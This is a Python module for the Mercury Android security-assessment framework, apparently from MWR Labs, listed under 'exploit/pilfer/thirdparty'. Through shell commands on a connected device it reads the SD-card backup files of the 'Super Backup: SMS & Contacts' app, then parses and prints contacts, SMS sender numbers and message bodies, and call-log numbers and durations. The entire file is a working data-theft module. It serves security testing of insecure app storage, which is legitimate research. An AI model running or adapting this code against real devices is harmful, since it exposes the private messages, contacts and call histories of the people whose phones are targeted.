import os
from merc.lib.modules import Module
import re
class com_idea_backup_smscontacts(Module):
    """Grabs SMS, Contact and Call Log Backups from SDCard for the application 'Super Backup : SMS & Contacts'(com.idea.backup.smscontacts)
https://play.google.com/store/apps/details?id=com.idea.backup.smscontacts&hl=en
Henry Hoggard - MWRLabs"""
    
    def __init__(self, *args, **kwargs):
        Module.__init__(self, *args, **kwargs)
        self.path = ["exploit", "pilfer", "thirdparty"]

    def execute(self, session, _arg):
        reFindCallerID = re.compile('<sms address="(.*)" date="')
        reFindMessage = re.compile('body="(.*)" read="')
        reFindCallNumber = re.compile('<log number="(.*)" date="')
        reFindCallDuration = re.compile('dur="(.*)" />')
        dir = os.getcwd()
        
        result = session.executeCommand("shell","executeSingleCommand", {"args":"ls /mnt/sdcard/SmsContactsBackup/"}).getPaddedErrorOrData()

        for r in result.split("\n"):
            if r != "":
                if r != "logs":
                    print 'mercury> Downloading ' + r
                    content = session.executeCommand("shell", "executeSingleCommand", {"args": "cat /mnt/sdcard/SmsContactsBackup/"+r}).getPaddedErrorOrData()

                    if "vcf" in r:
                        print 'mercury> Dumping Contacts...............'
                        print '========================================'
                        print content
                    
                    else:
                        callerIDs = re.findall(reFindCallerID,content)
                        body = re.findall(reFindMessage, content)
                    
                       
                        print 'mercury> Dumping SMS.............'
                        print '==================================================='
                        for i in range(len(callerIDs)):
                            
                            print 'Caller ID = '+ callerIDs[i]
                            print 'Body = ' + body[i]
                            print '-------------------------------------------------'
                            
                 
                
                
   

        result2 = session.executeCommand("shell","executeSingleCommand", {"args":"ls /mnt/sdcard/SmsContactsBackup/logs/"}).getPaddedErrorOrData()
        for x in result2.split("\n"):
            if x !="":
                content2 = session.executeCommand("shell", "executeSingleCommand", {"args": "cat /mnt/sdcard/SmsContactsBackup/logs/"+x}).getPaddedErrorOrData()

                print 'mercury> Downloading ' + x
                print 'mercury> Dumping Call Logs.............'
                print '======================================='
                callnumber = re.findall(reFindCallNumber, content2)
                duration = re.findall(reFindCallDuration, content2)
                for y in range(len(callnumber)):
                    print 'Caller ID = ' + callnumber[y]
                    print 'Duration = ' + duration[y]
                    print '----------------------------------------------'
                    
                    
                
